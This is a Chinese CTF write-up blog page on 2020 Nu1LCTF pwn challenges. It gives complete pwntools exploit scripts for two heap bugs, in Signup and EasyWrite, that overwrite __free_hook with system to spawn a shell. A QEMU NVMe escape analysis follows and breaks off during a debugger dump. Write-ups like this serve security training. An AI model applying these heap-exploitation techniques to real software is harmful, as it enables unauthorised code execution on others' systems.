<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2020 Nu1LCTF 部分PWN WriteUp | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Signup程序实现了一种vector的实现。程序在1,2,4,8,16...申请新的堆块，拷贝数据，并释放旧的堆块。但是在进行删除Delete函数的时候没有对边界进行判断，导致我们可以进行无限次释放，从而将vector-&gt;current指针指向已经释放的unsorted bin的fd，从而泄露出libc基址。 泄露出libc基址之后，我们可以直接利用指针越界覆写0x20大小的堆块的fd指针">
<meta property="og:type" content="article">
<meta property="og:title" content="2020 Nu1LCTF 部分PWN WriteUp">
<meta property="og:url" content="https://www.lyyl.online/posts/2291042632.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="Signup程序实现了一种vector的实现。程序在1,2,4,8,16...申请新的堆块，拷贝数据，并释放旧的堆块。但是在进行删除Delete函数的时候没有对边界进行判断，导致我们可以进行无限次释放，从而将vector-&gt;current指针指向已经释放的unsorted bin的fd，从而泄露出libc基址。 泄露出libc基址之后，我们可以直接利用指针越界覆写0x20大小的堆块的fd指针">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-67.jpeg">
<meta property="article:published_time" content="2021-07-30T07:20:23.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.322Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-67.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/2291042632"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2020 Nu1LCTF 部分PWN WriteUp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-67.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2020 Nu1LCTF 部分PWN WriteUp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-07-30T07:20:23.000Z" title="undefined 2021-07-30 15:20:23">2021-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-WriteUp/">CTF WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>48分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2020 Nu1LCTF 部分PWN WriteUp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Signup"><a href="#Signup" class="headerlink" title="Signup"></a>Signup</h2><p>程序实现了一种<code>vector</code>的实现。程序在<code>1,2,4,8,16...</code>申请新的堆块，拷贝数据，并释放旧的堆块。但是在进行删除<code>Delete</code>函数的时候没有对边界进行判断，导致我们可以进行无限次释放，从而将<code>vector-&gt;current</code>指针指向已经释放的<code>unsorted bin</code>的<code>fd</code>，从而泄露出<code>libc</code>基址。</p>
<p>泄露出<code>libc</code>基址之后，我们可以直接利用指针越界覆写<code>0x20</code>大小的堆块的<code>fd</code>指针，利用第二个<code>vector</code>覆写<code>free_hook</code>，释放带有<code>/bin/sh</code>的堆块。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./signin&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x11d2)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, number</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Number:&quot;</span>, <span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x800</span>/<span class="number">8</span>) + <span class="number">1</span>):</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x800</span>/<span class="number">8</span>)*<span class="number">2</span> + <span class="number">2</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline()) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="number">0x860</span>/<span class="number">8</span>) + <span class="number">1</span>):</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p, <span class="string">&quot;b *$rebase(0x11d2)&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">add(<span class="number">1</span>, libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">2</span>, u64(<span class="string">&quot;/bin/sh\\x00&quot;</span>))</span><br><span class="line">add(<span class="number">2</span>, libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="EasyWrite"><a href="#EasyWrite" class="headerlink" title="EasyWrite"></a>EasyWrite</h2><p>程序可以向任意地址写入堆的地址，之后释放了一个重新申请的<code>0x40</code>大小的堆块。这里主要的难点就是如何选取任意写的位置。从<code>WP</code>中我们知道，<code>libc</code>高地址处保存着一个<code>tcache</code>的指针。但是从源代码中看到<code>tcache</code>是一个全局变量，而从汇编代码中看到它保存在<code>fs:[0xffffffffffffffb0]</code>的位置，暂时不知道怎么查看这个值。猜测可能是<code>fs</code>在内存中的映射。</p>
<p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020%20Nu1LCTF%20%E9%83%A8%E5%88%86PWN%20WriteUp/Untitled.png" alt="2020%20Nu1LCTF%20%E9%83%A8%E5%88%86PWN%20WriteUp%206b5590616602455f9a4ceb31a0d92d2c/Untitled.png"></p>
<p>那么如果我们将<code>tcache</code>指向程序一开始分配的<code>0x300</code>大小的堆块，也就是说之后<code>tcache</code>的管理就从我们设置的堆块开始了，在其中伪造<code>0x40</code>大小堆块处的指针为<code>free_hook-0x10</code>，那么在之后就能够覆写<code>free_hook</code>，并在堆块的起始填入<code>/bin/sh</code>。释放该堆块即可<code>getsell</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easywrite&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(0x12c4)&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Here is your gift:&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\\n&quot;</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">fake_tcache_pthread_struct = p32(<span class="number">0</span>) + p32(<span class="number">0x1</span>)</span><br><span class="line">fake_tcache_pthread_struct += p64(<span class="number">0</span>) * <span class="built_in">int</span>((<span class="number">0x410</span>-<span class="number">0x20</span> + <span class="number">0x10</span>)/(<span class="number">8</span> * <span class="number">8</span>) - <span class="number">1</span>)</span><br><span class="line">fake_tcache_pthread_struct += p64(<span class="number">0</span>)* <span class="number">2</span> + p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;message:&quot;</span>, fake_tcache_pthread_struct)</span><br><span class="line">p.sendafter(<span class="string">&quot;to write?:&quot;</span>, p64(libc.address + <span class="number">0x1f34f0</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;message?:&quot;</span>, <span class="string">b&quot;/bin/sh\\x00&quot;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&quot;\\x00&quot;</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="kemu"><a href="#kemu" class="headerlink" title="kemu"></a>kemu</h2><p><code>qemu逃逸</code></p>
<p>没有符号表，首先我们看一下启动脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pwd</span>=`<span class="built_in">pwd</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment">#./qemu-system-x86_64 \\</span></span><br><span class="line"><span class="built_in">timeout</span> --foreground 600 <span class="variable">$&#123;pwd&#125;</span>/qemu-system-x86_64 \\</span><br><span class="line">        -initrd <span class="variable">$&#123;pwd&#125;</span>/rootfs.img -nographic -kernel <span class="variable">$&#123;pwd&#125;</span>/kernel-guest \\</span><br><span class="line">        -L <span class="variable">$&#123;pwd&#125;</span>/pc-bios -append <span class="string">&quot;priority=low console=ttyS0 loglevel=3 kaslr&quot;</span> \\</span><br><span class="line">        -drive file=<span class="variable">$&#123;pwd&#125;</span>/nvme.raw,format=raw,<span class="keyword">if</span>=none,<span class="built_in">id</span>=Dxx -device nvme,drive=Dxx,serial=1234 \\</span><br><span class="line">        -monitor /dev/null</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到这里直接加了<code>nvme</code>的<code>device</code>。但是程序没有符号表，因此这里我们搜索一下字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__fastcall <span class="title function_">nvme_class_init</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> **result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = (_QWORD *)sub_5C5EA0(a1, <span class="string">&quot;device&quot;</span>, <span class="string">&quot;hw/block/nvme.c&quot;</span>, <span class="number">1363LL</span>, <span class="string">&quot;nvme_class_init&quot;</span>);</span><br><span class="line">  v2 = sub_5C5EA0(a1, <span class="string">&quot;pci-device&quot;</span>, <span class="string">&quot;hw/block/nvme.c&quot;</span>, <span class="number">1364LL</span>, <span class="string">&quot;nvme_class_init&quot;</span>);</span><br><span class="line">  *(_DWORD *)(v2 + <span class="number">208</span>) = <span class="number">0x58458086</span>;</span><br><span class="line">  *(_BYTE *)(v2 + <span class="number">212</span>) = <span class="number">2</span>;</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">176</span>) = nvme_realize;</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">184</span>) = nvme_exit;</span><br><span class="line">  *(_WORD *)(v2 + <span class="number">214</span>) = <span class="number">0x108</span>;</span><br><span class="line">  v1[<span class="number">12</span>] |= <span class="number">4uLL</span>;</span><br><span class="line">  v1[<span class="number">14</span>] = <span class="string">&quot;Non-Volatile Memory Express&quot;</span>;</span><br><span class="line">  v1[<span class="number">15</span>] = &amp;off_F326E0;</span><br><span class="line">  result = &amp;off_D749C0;</span><br><span class="line">  v1[<span class="number">20</span>] = &amp;off_D749C0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看到<code>0x58458086</code>和<code>0x108</code>这两个字符串，也就是说这里的<code>vendor_id</code>是<code>0x8086</code>，<code>deviceid</code>就是<code>0x5845</code>，这里的<code>0x108</code>指的是设备的类型。我们看一下<code>lspci</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0108: 8086:5845</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从这里的<code>id</code>我们可以看到是<code>00:04.0</code>这个设备，看一下<code>resource</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="comment"># cat /sys/devices/pci0000\\:00/0000\\:00\\:04.0/resource</span></span><br><span class="line">0x00000000febf0000 0x00000000febf1fff 0x0000000000140204</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febf3000 0x00000000febf3fff 0x0000000000040200</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里存在两个内存空间。因此这里我们看一下<code>nvme_realize</code>函数。对照源码，我们可以识别出一些函数。需要注意的是这里的源码需要对应<code>qemu</code>的版本，这里的版本是<code>4.0.0</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(v11 + <span class="number">2928</span>, v11, nvme_mmio_ops, v11, <span class="string">&quot;nvme&quot;</span>, v26);</span><br><span class="line">pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">4LL</span>, v11 + <span class="number">2928</span>);</span><br><span class="line">msix_init_exclusive_bar(a1, *(<span class="type">unsigned</span> __int16 *)(v11 + <span class="number">3548</span>), <span class="number">4LL</span>, <span class="number">0LL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ( v29 )</span><br><span class="line">&#123;</span><br><span class="line">  memory_region_init_io(</span><br><span class="line">    v11 + <span class="number">3168</span>,</span><br><span class="line">    v11,</span><br><span class="line">    nvme_cmb_ops,</span><br><span class="line">    v11,</span><br><span class="line">    <span class="string">&quot;nvme-cmb&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v11 + <span class="number">3468</span>) &gt;&gt; <span class="number">12</span> &lt;&lt; (<span class="number">4</span> * (BYTE1(*(_DWORD *)(v11 + <span class="number">3468</span>)) &amp; <span class="number">0xF</span>) + <span class="number">12</span>)));</span><br><span class="line">  result = pci_register_bar(a1, *(_DWORD *)(v11 + <span class="number">3464</span>) &amp; <span class="number">7</span>, <span class="number">12LL</span>, v11 + <span class="number">3168</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从这一层的代码来看，这里的两个内存空间来自于<code>nvme,nvme-cmd</code>这两个。但是在调试过程中发现，这里的<code>if</code>循环根本就不会进入，因此第二个内存空间就不是<code>nvme-cmb</code>的。那么我们在<code>realize</code>和<code>memory_region_init_io</code>函数下断点。那么从<code>realize</code>进入之后，第一次断点就是<code>nvme</code>的内存空间的注册了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x55555719ebf0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RBX  <span class="number">0x5555571952e0</span> —▸ <span class="number">0x555556496660</span> —▸ <span class="number">0x5555563e0970</span> —▸ <span class="number">0x5555563e0af0</span> ◂— <span class="number">0x7f00656d766e</span> <span class="comment">/* 